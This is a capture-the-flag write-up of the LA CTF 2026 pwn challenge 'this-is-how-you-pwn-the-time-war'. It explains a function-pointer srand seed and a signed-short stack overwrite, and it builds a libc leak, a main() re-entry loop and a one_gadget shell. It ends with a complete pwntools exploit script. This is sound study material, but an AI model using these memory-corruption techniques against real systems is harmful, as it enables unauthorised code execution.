+++
title = "this-is-how-you-pwn-the-time-war: srand(fn_ptr) + 1/16 PIE redirect + libc re-entry loop (LA CTF 2026)"
date = 2026-02-10
summary = "The binary seeds rand() with a libc function pointer, not the time. A 1/16 PIE partial overwrite jumps into the middle of run() mid-printf, leaking a libc address straight out of scanf's register state. From there, five more rounds of OOB writes loop back through __libc_start_call_main, calling main() again and again, buying time to write a one_gadget over a return address."
tags = ["pwn", "ctf"]
+++

This ended up being the least solved pwn of the weekend, which is funny because the whole binary is 38 lines. I had a working local exploit in about four hours. Then I spent the rest of the day convinced I was missing something because the remote kept dying on me. Turned out nothing was actually wrong with the exploit. The only luck in this challenge is a 1/16 PIE nibble that has to land before you even get to the leak stage. Once I figured that out I just kept running the script until it connected right. Flag was there the whole time.

**Downloads:** [pwn_the_time_war](/assets/downloads/this-is-how-you-pwn-the-time-war/pwn_the_time_war) | [pwn_the_time_war.c](/assets/downloads/this-is-how-you-pwn-the-time-war/pwn_the_time_war.c) | [Dockerfile](/assets/downloads/this-is-how-you-pwn-the-time-war/Dockerfile)

---

## Protections

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
```

Partial RELRO: the GOT is writable. No canary: stack corruption isn't caught at function exit. PIE: all addresses are ASLR'd, so we need a leak. No canary is a gift. NX means no shellcode in the data segment, so we're heading toward a libc gadget.

---

## Reading the Source

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

void run();

void init() {
    setbuf(stdout, NULL);
    srand(clock_gettime);
}

void run() {
    short code[4];
    for (int i = 0; i < 4; i++) {
        code[i] = rand() % 16;
    }
    printf("You see a locked box. The dial on the lock reads: %d-%d-%d-%d\n",
           code[0], code[1], code[2], code[3]);
    printf("Which dial do you want to turn? ");
    short ind1, val1, ind2, val2;
    if (scanf("%hd", &ind1) <= 0) {
        return;
    }
    printf("What do you want to set it to? ");
    scanf("%hd", &val1);
    printf("Second dial to turn? ");
    scanf("%hd", &ind2);
    printf("What do you want to set it to? ");
    scanf("%hd", &val2);
    code[ind1] = val1;
    code[ind2] = val2;
    printf("The box remains locked.\n");
}

int main(void) {
    init();
    run();
    return 0;
}
```

The source is 38 lines. The bugs are hiding in plain sight.

### Bug 1: `srand(clock_gettime)` seeds from a libc address

Look at `init()`:

```c
srand(clock_gettime);
```

There are no parentheses after `clock_gettime`. This is not a call to `clock_gettime`. This is passing the **function pointer** (the address of `clock_gettime` in libc) as the seed to `srand`. `srand` takes an `unsigned int`, so the 64-bit address gets truncated to its low 32 bits.

Let's nail this down. `clock_gettime` lives at libc offset `0xcf420`. With libc loaded at base `B`:

```
clock_gettime = B + 0xcf420
seed          = (B + 0xcf420) & 0xffffffff
```

The low 12 bits of any page-aligned libc base are always `0x000`, so the low 12 bits of the seed are always `0x420`. The upper bits depend on where ASLR placed libc. This means every run seeds `rand()` with a value derived from ASLR, and the rand output we see on screen gives us information about the seed.

### Bug 2: Signed short OOB write

```c
short code[4];
...
short ind1, val1, ind2, val2;
scanf("%hd", &ind1);
...
code[ind1] = val1;
```

`ind1` is a **signed short**, and there is **no bounds check**. If you send a negative index or a large positive index, `code[ind] = val` will write 2 bytes (`val` interpreted as a signed short) to an arbitrary location relative to `code[0]` on the stack. The write target is `&code[0] + ind * 2`.

`code[0]` lives at `rbp - 0xc` inside `run()`. We can reach anything on the stack, including past `run()`'s frame into `main()`'s frame and beyond.

---

## Stack Layout

Let's map the stack carefully. With ASLR disabled for analysis, in GDB:

```
run()  rbp = 0x7fffffffe5a0
main() rbp = 0x7fffffffe5b0   (saved at run's rbp+0x00)
```

`code[0]` lives at `rbp - 0xc = 0x7fffffffe594`. Each index steps 2 bytes further. So:

```
code_base = rbp - 0xc = 0x7fffffffe594

code[ind] -> code_base + ind * 2

  ind  | address            | what lives there
-------|--------------------|----------------------------------
   0   | 0x7fffffffe594     | code[0] (rand output)
   1   | 0x7fffffffe596     | code[1]
   2   | 0x7fffffffe598     | code[2]
   3   | 0x7fffffffe59a     | code[3]
  ...  |                    |
  10   | 0x7fffffffe5a8     | run()'s return address  (rbp+0x08)
  18   | 0x7fffffffe5b8     | main()'s return address (rbp+0x18)
  54   | 0x7fffffffe600     | binary .data pointer    (rbp+0x60)
```

We can write to `run()`'s return address at `code[10]`, and to `main()`'s return address at `code[18]`. That's our control flow primitive.

---

## The 1/16 PIE Redirect

With PIE enabled, the binary's load address is randomised. But only 1 nibble of the low 16 bits actually changes: the low 12 bits are always `0x000` (page alignment) and the high bits are shared with the fixed upper 48 bits. For this binary, the only uncertainty in the low 16 bits of any address is the nibble at position 12. So:

```
binary_base & 0xffff  =  ?000
```

Where `?` is one of 16 possible nibbles. We don't know it.

After `run()` finishes normally and executes `leave; ret`, execution returns to `main+0x18`:

```
131c:  push   %rbp
131d:  mov    %rsp,%rbp
1320:  mov    $0x0,%eax
1325:  call   1189 <init>
132a:  mov    $0x0,%eax
132f:  call   11b2 <run>
1334:  mov    $0x0,%eax    <-- this is main+0x18, run()'s retaddr
1339:  pop    %rbp
133a:  ret
```

So run's return address (at `code[10]`) has low 16 bits = `base | 0x1334`. The only unknown is the top nibble of that low 16.

**The plan:** overwrite the low 16 bits of run's retaddr with a value that lands us somewhere useful, specifically when the ASLR nibble happens to be `0x1`. We want to land at binary offset `0x1210`:

```
1210:  lea    0xdf1(%rip),%rax   # format string
1217:  mov    %rax,%rdi
121a:  mov    $0x0,%eax
121f:  call   printf@plt          <-- we want to execute from here
```

This is the `printf` call inside `run()` that prints the dial values. If `base & 0xf000 = 0x1000`, then:

```
run's retaddr (low16) = 0x1334
write 0x2210 -> new low16 = 0x2210
actual address = (base & ~0xffff) | 0x2210
```

Wait, but if base nibble is `0x1`, then `base = ...0x1000`, and:

```
(base & ~0xffff) | 0x2210 = base + 0x1210
```

That lands us at `binary+0x1210`. The rand loop (which runs from `0x11c3` through `0x11ef`) is completely **skipped**. We jump straight to the `printf` that prints the dial values.

We write `0x2210 = 8720` to `code[10]`. This succeeds with probability 1/16 (when the ASLR nibble is `0x1`). We just retry until we get it.

What about `code[54] = 20736 = 0x5100`? Index 54 targets `rbp + 0x60`, which holds a pointer into the binary's `.data` section (`0x...7dd0`). Writing `0x5100` changes its low 16 bits to `0x5100`, making it point into `.text`. This patches a pointer the binary holds about itself; we'll come back to why.

**Round 1 inputs:**
```
Which dial to turn? 10
Set it to?         8720   (= 0x2210, patches run's retaddr low16)
Second dial?       54
Set it to?         20736  (= 0x5100, patches .data pointer)
```

After `run()` executes `leave; ret`, if the nibble was right, execution jumps to `binary+0x1210`.

---

## The Leak: printf With scanf's Register State

Here's where the magic happens. We just jumped to `binary+0x1210`, specifically the `printf` call inside `run()`, but we skipped the entire rand loop that was supposed to populate `code[]`. The registers from the last `scanf` call are still live.

Let's look at what `printf` reads. The format string is:

```
"You see a locked box. The dial on the lock reads: %d-%d-%d-%d\n"
```

Arguments to `printf` are passed in `rdi` (format), `rsi`, `rdx`, `rcx`, `r8`. The code at `0x11f1`–`0x120e` (which we skipped) would have set these from `code[]`. Since we skipped it:

- `esi = 1`: leftover from scanf's return value path  
- `edx = 1`: also from scanf internals  
- `ecx = libc_base + 0xf8340`: a libc-internal address left in rcx after the last `scanf` call returned  
- `r8d = 0x99999999`: a constant from the signed division optimisation inside scanf  

So `printf` prints:

```
You see a locked box. The dial on the lock reads: 1-1-<SIGNED_DECIMAL>-<-1717986919>
```

The third field, printed by `%d` from `ecx`, is `(libc_base + 0xf8340) & 0xffffffff` interpreted as a signed 32-bit integer. It may be negative. We read it back with:

```python
io.recvuntil(b'1-1-')

leak = io.recv(1)
while 1:
    x = io.recv(1)
    if x == b'-':
        break
    leak += x

leak = int(leak) & 0xffffffff
```

We call `int(leak) & 0xffffffff` to handle the case where the value is a negative decimal string; `& 0xffffffff` converts it to its unsigned 32-bit representation.

**The leak = `(libc_base + 0xf8340) & 0xffffffff`**

We verified this in GDB with ASLR off: `rcx = 0x7ffff7ed8340`, `libc_base = 0x7ffff7de0000`, difference = `0xf8340`. ✓

---

## Deriving Every Offset From the Leak

Now that we know `leak = (libc_base + 0xf8340) & 0xffffffff`, we can compute the low 32 bits of any libc address we want.

### `write = leak - 0xd10f6 - 0x1a = libc_base + 0x27230`

```
libc+0x27230  belongs to __libc_start_call_main
```

Disassembly of that region:

```asm
; libc+0x27230:
mov    0x1abd59(%rip),%rax
mov    0x18(%rsp),%rsi
mov    0x14(%rsp),%edi
mov    (%rax),%rdx
mov    0x8(%rsp),%rax
call   *%rax              ; <- this calls main()
```

This is the instruction sequence inside `__libc_start_call_main` that **calls `main()`**. If we redirect a return address to here, execution will call `main()` again, which calls `run()` again, giving us another round of OOB writes. We use this to build a loop.

We want to overwrite main's return address (currently `__libc_start_call_main+N`) with the low 16 bits of `libc+0x27230`. Since both values are in the same libc page region, the upper 32 bits are already correct, so we just patch the low 16 bits.

```python
write = leak - 0xd10f6 - 0x1a   # = (libc_base + 0x27230) & 0xffffffff
# verify: 0xf8340 - 0xd10f6 - 0x1a = 0x27230 ✓
```

### `gadget = leak + 0x9b19 = libc_base + 0x101e59`

```asm
; libc+0x101e59:
xor    %eax,%eax
add    $0x18,%rsp
pop    %rbx
pop    %rbp
pop    %r12
pop    %r13
pop    %r14
pop    %r15
ret
```

A stack-cleaning gadget. We write this into a stack slot that gets returned to on the way through the loop, to skip over values that would otherwise corrupt control flow.

### `one_gadget = leak - 0xac207 = libc_base + 0x4c139`

Confirmed by `one_gadget libc.so.6`:

```
0x4c139  posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  address rsp+0x60 is writable
  rsp & 0xf == 0
  rax == NULL || {"sh", rax, r12, NULL} is a valid argv
  rbx == NULL || (u16)[rbx] == NULL
```

This is our shell gadget. `rbx == NULL || (u16)[rbx] == NULL` is the key constraint: we need either `rbx = 0` or the memory at `rbx` to be zeroed. This is why the exploit can fail on some runs: the constraint depends on runtime register state. On remote, it's satisfied enough of the time.

### `write2 = leak - 0xd0c59 = libc_base + 0x276e7`

```
libc+0x276e7  is inside __libc_start_main
```

This is the final trigger target: the epilogue of `__libc_start_main` that does `add $0x38,%rsp; pop %rbx; pop %rbp; ret`. We redirect main's retaddr to here one last time to break out of the re-entry loop and fall through the stack into our gadget chain.

---

## The Re-entry Loop

After Stage 1's `leave; ret` jumps to `binary+0x1210`, execution continues through `run()` normally (printf, scanf, the two OOB writes, `leave; ret`).

At this point we're in a **partial run frame**: `run()` did `leave`, so `rbp` has been restored to main's rbp = `0x7fffffffe5b0`. Now `code_base = rbp - 0xc = 0x7fffffffe5a4`.

In this partial frame:
- `code[10]` → `0x7fffffffe5b8` = **main's return address** (`rbp+0x08`)
- `code[50]` → `0x7fffffffe608` = a stack value (ld.so area)

**Round 2 inputs (sent after the leak):**

```python
# Patch main's retaddr to loop back through __libc_start_call_main+0x27230
io.sendlineafter(b'Which dial do you want to turn? ', b'10')
io.sendlineafter(b'What do you want to set it to? ', str(write & 0xffff).encode())

# Write low16 of stack-cleanup gadget into stack slot at code[50]
io.sendlineafter(b'Second dial to turn? ', b'50')
io.sendlineafter(b'What do you want to set it to? ', str(gadget & 0xffff).encode())
```

After `leave; ret`, execution reaches `libc+0x27230`. That code does `mov 0x8(%rsp),%rax; call *%rax` where `[rsp+8]` holds main's address (placed on stack by `__libc_start_call_main` before calling main). So it calls `main()` → `main()` calls `run()` → we're back in `run()` again, in the **full run frame** (rbp = `0x7fffffffe5a0`, code_base = `0x7fffffffe594`).

In the full run frame:
- `code[10]` → `0x7fffffffe5a8` = run's retaddr (rbp+0x08)
- `code[18]` → `0x7fffffffe5b8` = **main's retaddr** (rbp+0x18) ← same address as above!
- `code[59]` → `0x7fffffffe60a` = a stack slot

Each subsequent round keeps the loop alive by writing `write & 0xffff` to `code[18]` (main's retaddr), and uses the second write for a different purpose.

**Round 3:**
```python
# Keep the loop: re-patch main's retaddr
io.sendlineafter(b'Which dial do you want to turn? ', b'18')
io.sendlineafter(b'What do you want to set it to? ', str(write & 0xffff).encode())

# Write high 16 bits of stack-cleanup gadget
gadget = gadget >> 16
io.sendlineafter(b'Second dial to turn? ', b'59')
io.sendlineafter(b'What do you want to set it to? ', str(gadget).encode())
```

**Round 3.5: zero `code[74]` to guarantee rbx = 0:**

The cleanup gadget at `libc+0x101e59` does `add $0x18,%rsp; pop %rbx; ...`. After its `add $0x18`, rsp = run_rbp+0x88, and `pop %rbx` reads from that address. `run_rbp+0x88` is `code[74]` in the full run frame. The one_gadget constraint requires `rbx == NULL || (u16)[rbx] == NULL`, so we explicitly zero the slot that lands in rbx:

```python
io.sendlineafter(b'Which dial do you want to turn? ', b'18')
io.sendlineafter(b'What do you want to set it to? ', str(write & 0xffff).encode())

io.sendlineafter(b'Second dial to turn? ', b'74')
io.sendlineafter(b'What do you want to set it to? ', b'0')
```

This makes the rbx constraint deterministic. No luck required.

**Round 4: write low 16 bits of one_gadget:**
```python
io.sendlineafter(b'Which dial do you want to turn? ', b'18')
io.sendlineafter(b'What do you want to set it to? ', str(write & 0xffff).encode())

io.sendlineafter(b'Second dial to turn? ', b'98')
io.sendlineafter(b'What do you want to set it to? ', str(one_gadget & 0xffff).encode())
```

`code[98]` → `0x7fffffffe658` (rbp+0xb8) = a libc pointer on the stack. We patch its low 16 bits with the low 16 bits of `one_gadget`.

**Round 5: write high 16 bits of one_gadget:**
```python
one_gadget = one_gadget >> 16

io.sendlineafter(b'Which dial do you want to turn? ', b'18')
io.sendlineafter(b'What do you want to set it to? ', str(write & 0xffff).encode())

io.sendlineafter(b'Second dial to turn? ', b'99')
io.sendlineafter(b'What do you want to set it to? ', str(one_gadget & 0xffff).encode())
```

`code[99]` → `0x7fffffffe65a` (rbp+0xba) = the next 2 bytes of the same pointer. After rounds 4 and 5, the 32-bit value at `0x7fffffffe658` is `one_gadget & 0xffffffff`. The upper 32 bits of that stack slot already contain `0x00007fff...` from the libc pointer that was there, so the full 64-bit value is now exactly `one_gadget`.

---

## The Trigger

**Round 6: trigger the chain:**
```python
# Patch run's retaddr (code[10] in full frame -> rbp+0x08 -> 0x7fffffffe5a8)
# 0x2012: when base nibble = 0x1, this hits binary+0x1012 (a benign/no-op region)
io.sendlineafter(b'Which dial do you want to turn? ', b'10')
io.sendlineafter(b'What do you want to set it to? ', str(0x2012).encode())

# Change main's retaddr from the loop address to write2 (epilogue of __libc_start_main)
io.sendlineafter(b'Second dial to turn? ', b'18')
io.sendlineafter(b'What do you want to set it to? ', str(write2 & 0xffff).encode())
```

`write2 = libc+0x276e7` is inside `__libc_start_main`'s epilogue: `add $0x38,%rsp; pop %rbx; pop %rbp; ret`. When main's `leave; ret` jumps there, `add $0x38,%rsp` advances the stack past stored libc values, two registers are popped, and then `ret` pops the next value, which is the cleanup gadget we placed at `code[50]` back in Round 2.

The cleanup gadget (`libc+0x101e59`) then runs: `xor %eax,%eax; add $0x18,%rsp; pop %rbx; pop %rbp; pop %r12; pop %r13; pop %r14; pop %r15; ret`. Its `pop %rbx` reads from `run_rbp+0x88` = `code[74]`, which we zeroed in Round 3.5, so `rbx = 0`. Six pops later, `ret` pops `one_gadget` from `code[98]`. Shell.

---

## Why Multiple Runs?

One source of luck:

1. **Stage 1 nibble BF (1/16):** The redirect to `binary+0x1210` only works when `base & 0xf000 = 0x1000`. We detect success because the binary prints `1-1-<BIG_NUMBER>-<-1717986919>` instead of four small single-digit numbers. If we don't see that pattern, we reconnect and try again.

The one_gadget constraint (`rbx == NULL || (u16)[rbx] == NULL`) is handled deterministically by Round 3.5: zeroing `code[74]` ensures the cleanup gadget pops `rbx = 0` before reaching one_gadget, so there's no second source of luck.

The `timeout=2` on `recvuntil(b'1-1-')` is the detection logic: if we don't see `1-1-` within 2 seconds, the redirect failed and we reconnect.

---

## Putting It Together

```python
from pwn import *

elf = context.binary = ELF("./pwn_the_time_war")

while True:
    io = connect("chall.lac.tf", 31313)

    # Stage 1: redirect run()'s retaddr to binary+0x1210 (1/16 chance)
    # code[10] = 8720 = 0x2210 -> patches low16 of run's retaddr
    # code[54] = 20736 = 0x5100 -> patches .data pointer to .text
    io.sendlineafter(b'Which dial do you want to turn? ', b'10')
    io.sendlineafter(b'What do you want to set it to? ', b'8720')

    io.sendlineafter(b'Second dial to turn? ', b'54')
    io.sendlineafter(b'What do you want to set it to? ', b'20736')

    # Stage 2: receive leak from printf with scanf's register state
    # If this times out, nibble was wrong; restart
    try:
        io.recvuntil(b'1-1-', timeout=2)
    except EOFError:
        io.close()
        continue

    leak = io.recv(1)
    while 1:
        x = io.recv(1)
        if x == b'-':
            break
        leak += x

    # int() handles negative decimal strings; &0xffffffff normalises to unsigned
    leak = int(leak) & 0xffffffff

    # leak = (libc_base + 0xf8340) & 0xffffffff
    write      = (leak - 0xd10f6 - 0x1a) & 0xffffffff  # libc+0x27230
    gadget     = (leak + 0x9b19)          & 0xffffffff  # libc+0x101e59
    write2     = (leak - 0xd0c59)         & 0xffffffff  # libc+0x276e7
    one_gadget = (leak - 0xac207)         & 0xffffffff  # libc+0x4c139

    # Round 2 (partial run frame, rbp=main_rbp):
    #   code[10] -> main's retaddr; code[50] -> gadget low16
    io.sendlineafter(b'Which dial do you want to turn? ', b'10')
    io.sendlineafter(b'What do you want to set it to? ', str(write & 0xffff).encode())

    io.sendlineafter(b'Second dial to turn? ', b'50')
    io.sendlineafter(b'What do you want to set it to? ', str(gadget & 0xffff).encode())

    gadget_hi = gadget >> 16

    # Round 3 (full run frame):
    #   code[18] -> main's retaddr (keep loop); code[59] -> gadget high16
    io.sendlineafter(b'Which dial do you want to turn? ', b'18')
    io.sendlineafter(b'What do you want to set it to? ', str(write & 0xffff).encode())

    io.sendlineafter(b'Second dial to turn? ', b'59')
    io.sendlineafter(b'What do you want to set it to? ', str(gadget_hi).encode())

    # Round 3.5: zero code[74] = run_rbp+0x88
    # cleanup gadget's pop %rbx reads from here; must be 0 for one_gadget constraint
    io.sendlineafter(b'Which dial do you want to turn? ', b'18')
    io.sendlineafter(b'What do you want to set it to? ', str(write & 0xffff).encode())

    io.sendlineafter(b'Second dial to turn? ', b'74')
    io.sendlineafter(b'What do you want to set it to? ', b'0')

    # Round 4: write low16 of one_gadget to stack slot at code[98]
    io.sendlineafter(b'Which dial do you want to turn? ', b'18')
    io.sendlineafter(b'What do you want to set it to? ', str(write & 0xffff).encode())

    io.sendlineafter(b'Second dial to turn? ', b'98')
    io.sendlineafter(b'What do you want to set it to? ', str(one_gadget & 0xffff).encode())

    # Round 5: write high16 of one_gadget to code[99]
    og_hi = (one_gadget >> 16) & 0xffff
    io.sendlineafter(b'Which dial do you want to turn? ', b'18')
    io.sendlineafter(b'What do you want to set it to? ', str(write & 0xffff).encode())

    io.sendlineafter(b'Second dial to turn? ', b'99')
    io.sendlineafter(b'What do you want to set it to? ', str(og_hi).encode())

    # Round 6: trigger
    #   code[10] = 0x2012 -> redirect run's retaddr away from loop
    #   code[18] = write2 -> main's retaddr = __libc_start_main epilogue
    #   write2 (add $0x38 + 2 pops + ret) lands on cleanup gadget at code[50]
    #   cleanup gadget (add $0x18 + 6 pops + ret) lands on one_gadget at code[98]
    io.sendlineafter(b'Which dial do you want to turn? ', b'10')
    io.sendlineafter(b'What do you want to set it to? ', str(0x2012).encode())

    io.sendlineafter(b'Second dial to turn? ', b'18')
    io.sendlineafter(b'What do you want to set it to? ', str(write2 & 0xffff).encode())

    # run() always prints "The box remains locked." before leave;ret; consume it
    try:
        io.recvuntil(b'The box remains locked.\n', timeout=3)
    except Exception:
        io.close()
        continue

    io.interactive()
    break
```

---

## Flag

<img src="/assets/media/this-is-how-you-pwn-the-time-war/flag.png" alt="flag screenshot" style="max-width:100%">

```
lactf{pwn_challs_are_bits_in_binaries_cast_into_the_waves_of_time}
```

---

## Takeaways

**`srand(fn_ptr)` is the actual bug pattern here.** The challenge name is literally "pwn the time," and the intended misdirection is that you'd assume `srand(clock_gettime)` calls `clock_gettime` to seed from the wall clock. It doesn't. The function pointer *is* the seed. The whole rand output is determined by libc's load address.

**You don't need to crack the seed.** The register leak from `printf` with stale scanf registers gives us a libc address directly; no brute force of 2^20 candidates needed. The 1/16 PIE nibble is the only probability we have to grind through, and that's just a matter of reconnecting.

**A signed short OOB write with no bounds check is a full stack write primitive.** Two indices, two values, per call to `run()`. Six rounds of that, carefully chained through libc's re-entry mechanism, and you have an arbitrary libc address on the return path.

**The only luck is the 1/16 nibble.** The one_gadget's `rbx == NULL` constraint is handled deterministically by zeroing `code[74]` before triggering: the cleanup gadget pops that slot into rbx. Run the script until the PIE nibble lines up, and the shell follows.
